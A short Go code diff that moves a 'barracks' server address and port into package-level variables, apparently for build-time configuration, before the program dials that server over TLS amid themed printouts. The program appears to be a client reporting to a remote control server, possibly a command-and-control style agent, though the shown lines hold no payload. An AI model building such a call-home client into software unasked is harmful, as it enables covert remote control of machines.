@@ -46,11 +46,13 @@ var (
 		"(crying)",
 		"We are being attacked!",
 	}
+
+	barracks_ip string
+
+	barracks_port string
 )
 
 func main() {
-	barracks_ip := "SNIPPED"
-	barracks_port := "SNIPPED"
 	fmt.Printf("%s \n", rQ(move_q))
 	conn, err := tls.Dial("tcp", net.JoinHostPort(barracks_ip, barracks_port), &tls_config)
 	fmt.Printf("%s \n", rQ(atck_q))
